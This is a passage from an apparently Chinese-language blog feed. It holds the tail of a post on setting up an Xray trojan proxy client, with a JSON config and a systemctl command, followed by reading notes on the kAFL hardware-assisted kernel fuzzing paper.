class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;log&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;access&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;loglevel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;warning&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;inbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;socks&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 本地代理端口例如<span class="hljs-number">10808</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;socks&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;routeOnly&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;allowTransparent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> 本地代理端口例如<span class="hljs-number">10809</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;listen&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;sniffing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;destOverride&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;http&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;tls&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;routeOnly&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;auth&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;noauth&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;udp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;allowTransparent&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;outbounds&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;trojan&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;method&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chacha20&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;ota&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的密码&quot;</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">443</span><span class="hljs-punctuation">,</span><br>                        <span class="hljs-attr">&quot;level&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;streamSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;ws&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;security&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;tls&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;tlsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;allowInsecure&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;serverName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;fingerprint&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;chrome&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;wsSettings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;path&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/你的子路径&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                        <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你的域名&quot;</span><br>                    <span class="hljs-punctuation">&#125;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;mux&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;enabled&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;concurrency&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">-1</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;direct&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;freedom&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;tag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;protocol&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;blackhole&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;settings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;response&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                    <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http&quot;</span><br>                <span class="hljs-punctuation">&#125;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;dns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;hosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;dns.google&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;proxy.example.com&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;servers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;你的域名&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;223.5.5.5&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;domains&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geosite:cn&quot;</span><span class="hljs-punctuation">,</span><br>                    <span class="hljs-string">&quot;geosite:geolocation-cn&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;expectIPs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;geoip:cn&quot;</span><br>                <span class="hljs-punctuation">]</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;1.1.1.1&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;8.8.8.8&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-string">&quot;https://dns.google/dns-query&quot;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;routing&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;domainStrategy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;AsIs&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;rules&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;inboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                    <span class="hljs-string">&quot;api&quot;</span><br>                <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;api&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;443&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;network&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;udp&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;block&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;field&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0-65535&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;outboundTag&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;proxy&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">]</span><br>    <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure><p>然后启动 xray：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo systemctl <span class="hljs-built_in">enable</span> --now xray.service</span><br></code></pre></td></tr></table></figure><p>最后找自己桌面环境对应的 Proxy 设置即可，以下是 Gnome 环境下配置成功的界面：</p><p><img src="https://s2.loli.net/2024/09/19/QiM9D76dvE8nIl1.png" alt="这是 Gnome"></p><h1 id="0xFF-What’s-more…"><a href="#0xFF-What’s-more…" class="headerlink" title="0xFF. What’s more…"></a>0xFF. What’s more…</h1><p>虽然说这个方案确乎是配置成功了，从原理上看似乎也是非常的安全，但是最终 <strong>还是没有办法在澳洲的校园网里玩原神</strong> ，主要原因是 <strong>延迟实在是太高了</strong> ……</p><p>不过至少到最后至少是收获了一些运维的小技巧不是么：）</p><p><img src="https://s2.loli.net/2024/09/18/3NVGfOJLndohSEm.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;这个原神啊，能忍住一秒不玩的都是神人了&lt;/p&gt;</summary>
    
    
    
    <category term="OPS" scheme="https://arttnba3.github.io/categories/OPS/"/>
    
    
    <category term="运维" scheme="https://arttnba3.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="原神" scheme="https://arttnba3.github.io/tags/%E5%8E%9F%E7%A5%9E/"/>
    
    <category term="Firewall" scheme="https://arttnba3.github.io/tags/Firewall/"/>
    
    <category term="VPN" scheme="https://arttnba3.github.io/tags/VPN/"/>
    
    <category term="NGINX" scheme="https://arttnba3.github.io/tags/NGINX/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x07】论文笔记：kAFL: Hardware-Assisted Feedback Fuzzing for OS Kernels</title>
    <link href="https://arttnba3.github.io/2024/07/30/PAPER-0X07-KAFL/"/>
    <id>https://arttnba3.github.io/2024/07/30/PAPER-0X07-KAFL/</id>
    <published>2024-07-30T11:53:16.000Z</published>
    <updated>2024-07-30T14:29:19.228Z</updated>
    
    <content type="html"><![CDATA[<p>Rabbit’s adventures in kernel land</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>在<a href="https://arttnba3.cn/2023/10/27/PAPER-0X04-HYPER_CUBE/">上一篇论文</a>当中我们介绍了这个作者针对虚拟机设计的 fuzzer，这次我们来看他的<a href="https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-schumilo.pdf">另一篇</a>使用 Intel PT 技术辅助的一个针对 OS kernel 设计的 fuzzer：<a href="https://github.com/RUB-SysSec/kAFL">kAFL</a></p><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>基于反馈的 fuzzing 非常强大，但对内核进行 fuzz 难以应用反馈机制（即代码覆盖率指导），且内核 crash 导致的 os 重启会影响 fuzz 的性能</p><p>本文使用虚拟化技术与 Intel PT（Processor Trace）技术带来独立于 OS 的硬件辅助的 fuzzing 解决方案，这使得我们只需要额外开发一小部分与内核交互的用户空间组件；作者还开发了 <a href="https://github.com/RUB-SysSec/kAFL">kernel-AFL 框架</a>，并在 Linux、Windows、macOS 上找到数个漏洞</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01. Introduction"></a>0x01. Introduction</h1><blockquote><p>经典的不用看的章节</p></blockquote><p>过去人们主要关注更容易被利用的用户态应用的安全漏洞，而随着用户态的各种加固，内核开始更加吸引攻击者</p><p>模糊测试长期以来被用来寻找漏洞，最新的反馈驱动型 fuzzer 通过反馈机制学习输入的有趣性并以此生成更多可能触发新路径的输入，但最火的 AFL 仅限于用户空间，fuzz 内核存在一系列额外的挑战：crash 与 timeout 需要虚拟化技术捕获并优雅地继续、内核代码存在更多不确定性、缺少 fuzz 命令行程序那样通过 stdin 直接输入的简易方法、部分内核组件不开源而无法在性能不损耗的情况下插桩</p><p>过去的内核 fuzzing 方法依赖于特定的驱动或是重编译，且由于使用模拟的缘故速度非常慢，或是非反馈驱动</p><p>本文介绍一种无需 ring0 代码甚至特定于 OS 的代码便能够对任意（甚至闭源）x86-64 内核进行 feedback fuzzing 的技术，实现为 kernel-AFL，Intel PT 技术提供了控制流信息，且生成反馈信息的开销极小（5%）</p><p>总而言之，本篇论文贡献如下：</p><ul><li><strong>OS independence</strong>：作者展示了使用 VMM 生成覆盖率来对大部分闭源内核组件进行反馈驱动 fuzzing 是可行的</li><li><strong>Hardware-assisted feedback</strong>：作者使用了 Intel Process Trace 技术，其开销极小</li><li><strong>Extensible and modular design</strong>：作者使用了模块化设计，方便支持其他的 x86 内核&#x2F;用户组件</li><li><strong>kernel-AFL</strong>：作者使用自己的理念开发了原型系统 <a href="https://github.com/RUB-SysSec/kAFL">kernel-AFL</a></li></ul><h1 id="0x02-Technical-Background"><a href="#0x02-Technical-Background" class="headerlink" title="0x02. Technical Background"></a>0x02. Technical Background</h1><p>本节介绍后续章节涉及的硬件特性</p><h2 id="2-1-x86-64-Virtual-Memory-Layouts"><a href="#2-1-x86-64-Virtual-Memory-Layouts" class="headerlink" title="2.1 x86-64 Virtual Memory Layouts"></a>2.1 x86-64 Virtual Memory Layouts</h2><p>内核空间通常位于虚拟高地址部分而用户空间位于低地址部分，OS 处理任务通常不会切换 CR3，而是在同一地址空间处理</p><h2 id="2-2-Intel-VT-x"><a href="#2-2-Intel-VT-x" class="headerlink" title="2.2 Intel VT-x"></a>2.2 Intel VT-x</h2><p>我们将 CPU 分为三类：物理 CPU、逻辑 CPU（超线程可能带来多于物理 CPU 数量的逻辑 CPU，但仅有一个同时活动）、虚拟 CPU（基于逻辑 CPU 建立）</p><p>虚拟化中角色分为两种：虚拟机监视器（Virtual Machine Monitor）和虚拟机（Virtual Machine），VMM 管控 VM，VM 在 VMM 提供的透明上下文中执行</p><p>Intel VT-x 技术提供了硬件辅助的 CPU 虚拟化特性，将 CPU 额外分为 VMXOFF（不开启虚拟化）与 VMXON（开启虚拟化）的运行模式，并区分 VMX non-root（用于 VM）与 VMX root（用于 VMM）两种执行模式</p><p>VM 可能通过各种原因触发 VM-Exit 事件将控制权转交给 VMM 进行处理，VMM 通过包含 vCPU 信息的 VMCS 结构创建、启动、控制 VM</p><h2 id="2-3-Intel-PT"><a href="#2-3-Intel-PT" class="headerlink" title="2.3 Intel PT"></a>2.3 Intel PT</h2><p>Intel 自第五代处理器引入 Intel PT 技术，提供执行和分支跟踪信息，不同于 <code>Intel Last Branch Record</code> 这样的分支记录技术，输出缓冲区的大小仅受主存大小而非特定寄存器的限制，输出格式基于数据包（packet-oriented）并分为通用执行信息与控制流信息包；Intel 在运行时提供各类控制流相关的数据包类型，因此我们需要用被跟踪的软件来翻译包含控制流分支地址的包</p><p>Intel 指定了五种类型的控制流影响指令，称为 <code>Change of Flow Instruction</code> （CoFI），不同类型的 CoFI 执行结果产生不同的信息包流，与本文相关的三种为：</p><ul><li><strong>Taken-Not-Taken</strong>（TNT）：条件跳转是否执行</li><li><strong>Target IP</strong>（TIP）：间接跳转或转移指令（<code>indirect branch, near ret, far transfer</code>）的目标</li><li><strong>Flow Update Packets</strong>（FUP）：如中断或陷阱等异步事件， FUP 之后通常跟随一个 TIP 以指示接下来的指令</li></ul><p>为了限制生成的数据量，Intel PT 提供了多种运行时过滤选项，如指令指针地址范围或特权级别（CPL），kAFL 以此将追踪限制为内核模式，同时利用 CR3 过滤来限制为特定的软件</p><p>Intel PT 支持为输出数据配置多目标域，kAFL 关注于允许指定多个输出区域的物理地址表（Table of Physical Addresses，ToPA）机制：每个 ToPA 表包含多个 ToPA 条目，其中包含用来存储追踪数据的内存块的物理地址、大小、类型（用于指示 CPU 访问 ToPA 表项时的行为）等信息</p><h1 id="0x03-System-Overview"><a href="#0x03-System-Overview" class="headerlink" title="0x03. System Overview"></a>0x03. System Overview</h1><p>这节介绍系统总体架构，分为三个组件：fuzzing logic、VM infrastructure（ QEMU-PT 与 KVM-PT）、user mode agent，整体架构如图 1 所示：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20240130045624.png"></p><p>模糊测试过程如图 2 所示：</p><ul><li><p>在 VM 启动时 user mode agent 的第一部分（loader）使用 hypercall <code>HC_SUBMIT_PANIC</code> 来向 QEMU-PT 提交 <code>kernel panic handler</code>  （Windows 下为 <code>BugCheck()</code> ）的地址，QEMU-PT 将其更改为一个 hypercall 调用例程以让我们快速得知 VM 中的 crashes</p></li><li><p>loader 使用 hypercall <code>HC_GET_PROGRAM</code> 来获取实际的 user mode agent 并启动</p></li><li><p>fuzzer 开始初始化，agent 触发一个会由 KVM-PT 处理的 hypercall <code>HC_SUBMIC_CR3</code>，hypervisor 从当前运行的程序中提取 CR3 的值并交给 QEMU-PT 进行过滤</p></li><li><p>最后，agent 使用 hypercall <code>HC_SUBMIT_BUFFER</code> 来提交其想要获取输入的地址，接下来开始主 fuzzing 循环</p></li><li><p>在主循环中，agent 通过 hypercall  <code>HC_GET_INPUT</code> 来获取新的输入，fuzzing logic 生成一个新的输入并交给 QEMU-PT 由其拷贝到 guest 内存中</p></li><li><p>在 VM-Entry 恢复虚拟机执行时开启 PT 追踪机制，此时 agent 使用输入与内核交互，在 Fuzzing 过程中 QEMU-PT 解码追踪数据并在需要时更新位图</p></li><li><p>交互完成后 agent 通过 hypercall <code>HC_FINISHED</code> 告知 hypervisor 停止追踪，位图被传递给 fuzzing logic 后续使用</p></li><li><p>最后 agent 可以继续运行任何未被追踪的清理程序，然后发出另一个 <code>HC_GET_INPUT</code> 以启动下一次循环迭代</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20240130045949.png"></p><h2 id="3-1-Fuzzing-Logic"><a href="#3-1-Fuzzing-Logic" class="headerlink" title="3.1 Fuzzing Logic"></a>3.1 Fuzzing Logic</h2><p><code>fuzzing logic</code> 是 kAFL 的控制组件，负责管理种子、生成输入等，大量采用了 AFL 所用的算法（如使用位图记录块转移），且使用并行 VM 协调提升性能，并负责与 QEMU-PT 通信以及显示统计数据</p><h2 id="3-2-User-Mode-Agent"><a href="#3-2-User-Mode-Agent" class="headerlink" title="3.2 User Mode Agent"></a>3.2 User Mode Agent</h2><p>在目标 OS 中运行的 <code>User Mode Agent</code> 通过 hypercall 与 <code>fuzzing logic</code> 同步并获取新输入以与内核交互，在实践中作者额外使用<code>loader component</code> 通过 hypercall 接收  <code>User Mode Agent</code> 二进制并执行，同时负责检查 agent 的状态</p><h2 id="3-3-Virtualization-Infrastructure"><a href="#3-3-Virtualization-Infrastructure" class="headerlink" title="3.3 Virtualization Infrastructure"></a>3.3 Virtualization Infrastructure</h2><p><code>fuzzing logic</code> 使用 QEMU-PT 与 KVM-PT 交互以创建 VMs，KVM-PT 允许我们限定 Intel PT 范围为 vCPU 执行期间，QEMU-PT 负责与 KVM-PT 交互以配置 Intel PT 并访问与解码 output buffer 的追踪数据为被执行的条件跳转指令的地址的流，且基于已知非确定性基本款地址进行过滤（以预防假阳性）后以 AFL 兼容的位图格式提供给 fuzzing logic</p><p>作者使用客制化的 Intel PT 解码器，与 Intel 的现有方案比带来了性能提升</p><h2 id="3-4-Stateful-and-Non-Deterministic-Code"><a href="#3-4-Stateful-and-Non-Deterministic-Code" class="headerlink" title="3.4 Stateful and Non-Deterministic Code"></a>3.4 Stateful and Non-Deterministic Code</h2><p>内核层的状态与异步性导致的不确定性需要被处理，状态不会被重置因为快照加载成本过高，中断可能带来不确定性基本块转移，作者使用两种技术解决这些问题：</p><p>第一种是过滤出中断及中断处理造成的转移，这可以通过 Intel PT 的追踪数据（带有 FUP 的 TIP）指示，丢弃直到 <code>iret</code> 指令前的基本块，同时通过一个简易的调用栈追踪所有中断（因为可能存在中断嵌套）</p><p>第二种是拉黑所有非确定性出现的基本块，作者会在位图更新时连续多次重新运行输入，将没有在所有试验中出现的基本块拉入黑名单，在后续处理在过滤</p><blockquote><p>注：笔者认为作者使用的第二种技术可能会存在非常大的假阳性，因为内核在不同状态下同一输入的结果可能也是不同的</p></blockquote><h2 id="3-5-Hypercall"><a href="#3-5-Hypercall" class="headerlink" title="3.5 Hypercall"></a>3.5 